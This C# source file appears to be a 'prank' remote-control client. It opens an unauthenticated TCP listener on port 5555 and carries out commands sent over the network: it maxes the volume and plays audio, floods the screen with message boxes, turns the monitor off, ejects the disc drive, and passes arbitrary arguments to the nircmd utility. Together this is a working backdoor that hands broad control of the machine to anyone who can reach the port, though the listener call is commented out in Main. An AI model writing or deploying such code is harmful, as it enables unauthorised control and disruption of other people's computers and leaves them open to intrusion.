using System;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Media;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace PrankClient
{
    class Program
    {
        static String cd = Environment.CurrentDirectory;
        //Communication methods
        static void mainComms()
        {
            string localIP;
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65534);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();
                socket.Close();
            }
            IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Parse(localIP), 5555);
            Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            listener.Bind(localEndPoint);
            listener.Listen(10);



            /*
             * Main loop
             */

            byte[] readBytes = new byte[1024];
            while (true)
            {
                Socket sessionSock = listener.Accept();
                int readBytesLen = sessionSock.Receive(readBytes);
                try
                {
                    processInput(Encoding.ASCII.GetString(readBytes));
                }catch(Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
                
            }



        }

        static void processInput(String input)
        {
            if (input.StartsWith("music"))
            {

                String filename = input.Split(' ')[1];
                playMusicFromWAV(filename);

            }else if (input.StartsWith("popups"))
            {
                int popupCount = int.Parse(input.Split(' ')[1]);
                popMessageBoxesSayingYeet(popupCount);
            }else if (input.StartsWith("monitor"))
            {
                String command = input.Split(' ')[1];
                if (command.ToLower().Equals("off"))
                {
                    turnOffScreen();
                }else
                {
                    turnOnScreen();
                }
            }else if (input.StartsWith("drives"))
            {
                openDiscDriveNircmd();
            }else if (input.StartsWith("nir"))
            {
                String arguments = input.Substring(4);
                try
                {
                    runNirCmd(arguments);
                }catch(Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
        }
        //End communication methods

        

        //Functionality Methods
        static void playMusicFromWAV(String filename)
        {
            try
            {
                maxVolumeNircmd();
                SoundPlayer player = new SoundPlayer(cd+"\\payload\\"+filename);
                player.Play();
                player.Dispose();
            }catch(Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            
        }
        
        static void messageBoxThreadMethod()
        {
            MessageBox.Show("yeet", "yert");
        }
        static void popMessageBoxesSayingYeet(int counter)
        {
            for (int i = 0; i <= counter; i++)
            {
                Thread t = new Thread(messageBoxThreadMethod);
                t.Start();
            }
        }
        [DllImport("user32.dll")]
        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
        static int monitorStateOn = -1;
        static int monitorStateOff = 2;
        static void turnOffScreen()
        {
            SendMessage(0xFFFF, 0x112, 0xF170, monitorStateOff);
        }
        static void turnOnScreen()
        {
            SendMessage(0xFFFF, 0x112, 0xF170, monitorStateOn);
        }


        static void maxVolumeNircmd()
        {
            System.Diagnostics.Process.Start(cd + "\\nircmdc.exe", "setsysvolume 65535");
        }

        static void openDiscDriveNircmd()
        {
            Console.WriteLine(cd + "\\nircmd.exe");
            try
            {
                System.Diagnostics.Process.Start(cd + "\\nircmdc.exe", "cdrom open");
            }catch(Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            
        }
        static void runNirCmd(String args)
        {
            System.Diagnostics.Process.Start(cd + "\\nircmdc.exe", args);
        }
        //End functionality methods
        //Main method
        static void Main(string[] args)
        {
            //mainComms();
        }
        //End Main method
    }
}
